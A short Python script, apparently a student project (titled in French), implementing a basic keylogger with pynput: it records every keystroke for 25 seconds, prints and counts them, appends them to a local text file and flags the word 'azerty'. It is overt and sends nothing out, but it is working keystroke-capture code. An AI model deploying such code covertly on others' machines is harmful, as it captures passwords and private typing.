
"""
Projet : Conception d'un keylogger en Python

"""

from pynput import keyboard
from time import sleep

# Automatically clear the terminal
import os
os.system("cls" if os.name == "nt" else "clear")

# Duration (in seconds) for key logging
LOGGING_TIME = 25

# Counts the number of keystrokes
count = 0

# Stores all typed characters
typed_text = ""


def on_key_pressed(key):
    
    global count, typed_text

    try:
        data = key.char
    except AttributeError as e:
        # Indicate special keys
        data = f"[{key}]"
    finally:

        #uptdate keystroke, display, log, and detect the word 'azerty"
        count += 1
        print_data(data)
        log_data(str(data))
        print(f"Nombre de frappes : {count}")

        if isinstance (data, str):
            typed_text += data.lower()
            if "azerty" in typed_text:
                print("Mot 'Azerty' detected!")


def print_data(data):
    print(data)



def log_data(data):
    with open("fichier.txt", "a") as f:
         f.write(str(data))
         f.write("\n")





def start_keylogger():

    print("Starting keylogger...")
    try:
        
        with keyboard.Listener(on_press=on_key_pressed) as listener:
            sleep(LOGGING_TIME)
    except Exception as e:
        # Display the error but continue the program
        print("erreur")
    finally:
        
        print("programme terminé!")


#Execute the keylogger
start_keylogger()
